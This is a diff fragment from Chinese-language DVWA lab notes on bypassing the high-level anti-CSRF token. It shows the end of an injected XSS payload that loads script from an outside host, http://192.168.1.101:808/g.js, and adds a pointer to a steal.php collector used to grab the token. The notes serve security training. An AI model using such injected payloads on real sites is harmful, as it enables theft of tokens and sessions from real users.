@@ -71,6 +71,8 @@ c) High级别的代码加入了Anti-CSRF token机制，用户每次访问改密�
 	b.setAttribute('src','http://192.168.1.101:808/g.js');
 	document.getElementsByTagName('head')[0].appendChild(b);">
 
+其中，steal.php在 ```https://github.com/leezp/note/blob/master/xss/dvwa-xss/steal.php```
+
 这一步操作和high级别存储型xss一样，如图，获取到token。
 ![](token.png)
 
